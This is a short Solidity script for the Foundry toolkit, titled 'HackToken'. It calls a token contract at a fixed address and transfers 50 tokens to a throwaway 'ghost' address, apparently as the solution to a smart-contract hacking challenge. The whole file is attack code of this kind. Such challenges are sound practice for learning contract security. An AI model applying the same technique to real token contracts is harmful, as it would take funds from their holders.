//SPDX-License-Identifier: MIT

import {Script, console} from "forge-std/Script.sol";

pragma solidity ^0.8.18;

interface IToken {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool);
    
}

contract HackToken is Script{
    IToken itoken_sol;
    address ghost = makeAddr("ghost");

    function run() external{
        address targetAddress = 0xAbDf26A8D1FAf3214459Fbf867F9E512E51D3ce1;
        itoken_sol = IToken(targetAddress);

        vm.startBroadcast();

        console.log("Ghost's balance before transfer: ", itoken_sol.balanceOf(ghost));
        itoken_sol.transfer(ghost, 50);
        console.log("Ghost's balance after transfer: ", itoken_sol.balanceOf(ghost));
        vm.stopBroadcast();

    }
}
